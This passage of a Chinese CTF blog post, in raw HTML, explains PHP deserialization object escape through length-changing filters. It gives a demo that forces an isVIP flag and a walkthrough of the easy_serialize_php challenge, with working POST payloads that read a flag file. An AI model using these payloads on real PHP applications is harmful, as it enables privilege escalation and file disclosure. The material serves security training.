class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class user&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public $username;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public $password;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public $isVIP;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public function __construct($u,$p)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$this-&amp;gt;username = $u;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$this-&amp;gt;password = $p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$this-&amp;gt;isVIP = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function filter($s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return str_replace(&amp;quot;admin&amp;quot;,&amp;quot;hack&amp;quot;,$s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = new user(&amp;#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;#x27;,&amp;#x27;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri = serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri_filter = filter($a_seri);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri_filter_unseri = unserialize($a_seri_filter);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump($a_seri_filter_unseri);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到结果：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;object(user)#2 (3) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;username&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  string(115) &amp;quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;password&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  string(6) &amp;quot;123456&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;isVIP&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结一下变短的步骤：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 分析他过滤了那个参数，那个参数是我们可控的&lt;/p&gt;
&lt;p&gt;​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中&lt;/p&gt;
&lt;p&gt;2. 构造我们的 payload，即我们想要覆盖哪个变量&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&lt;/code&gt; ，并且需要计算长度，为了我们之后的覆盖做准备&lt;/p&gt;
&lt;p&gt;3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们的目标长度 &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&lt;/code&gt;  为 47，到下一个可控变量长度 &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;&lt;/code&gt;  为 22&lt;/p&gt;
&lt;p&gt;​	那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP&lt;/p&gt;
&lt;p&gt;4. 进行覆盖与调整&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &amp;quot; 的位置和前面的字符串数量的位置相同&lt;/p&gt;
&lt;p&gt;5. 进行反序列化验证&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//变长&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:282:&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//变少&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:115:&amp;quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.secpulse.com/archives/165222.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;比如：[安洵杯 2019] easy_serialize_php&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; = @&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;f&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$img&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filter_arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;php5&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;php4&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;fl1g&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;implode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$filter_arr&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;#x27;/i&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;function&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;extract&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;a href=&amp;quot;index.php?f=highlight_file&amp;quot;&amp;gt;source_code&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;guest_img.png&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;title function_ invoke__&#34;&gt;sha1&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$serialize_info&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;highlight_file&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index.php&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//maybe you can find something in here!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;show_image&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$userinfo&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$serialize_info&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$userinfo&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于有了上面的基础，这边就简单缩缩了&lt;/p&gt;
&lt;p&gt;首先能造成对象逃逸的关键是 &lt;code&gt;    $serialize_info = filter(serialize($_SESSION));&lt;/code&gt; ，将 filter 里面的东西替换为空，导致字符变动，但序列化后的长度值没有变动&lt;/p&gt;
&lt;p&gt;exxtract () 函数从数组中将变量导入到当前的符号表 (本题的作用是将_SESSION 的两个函数变为 post 传参)&lt;/p&gt;
&lt;p&gt;同时题目告诉我们的 phpinfo 中 &lt;code&gt;d0g3_fllllllag&lt;/code&gt;  可以判断 flag 位置&lt;/p&gt;
&lt;p&gt;我们可以通过改变 img_path 的内容或者直接改变 userinfo [‘img’] 的内容来达到读取 flag 的目的&lt;/p&gt;
&lt;p&gt;0x00 键值逃逸&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_SESSION[user]=flagflagflagflagflagphp&amp;amp;_SESSION[function]=&amp;quot;;s:3:&amp;quot;img&amp;quot;;s:20:&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:1:&amp;quot;2&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s:3:&amp;quot;img&amp;quot;;s:20:&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;;s:1:&amp;quot;2&amp;quot;;&amp;#125;被当作了原来的value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在 echo file_get_contents(base64_decode($userinfo[&amp;#x27;img&amp;#x27;]));实现了读取flag的，目的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115171618604.png&#34; alt=&#34;image-20221115171618604&#34;&gt;&lt;/p&gt;
&lt;p&gt;0x01 键名逃逸&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_SESSION[flagphp]=;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;img&amp;quot;;s:20:&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 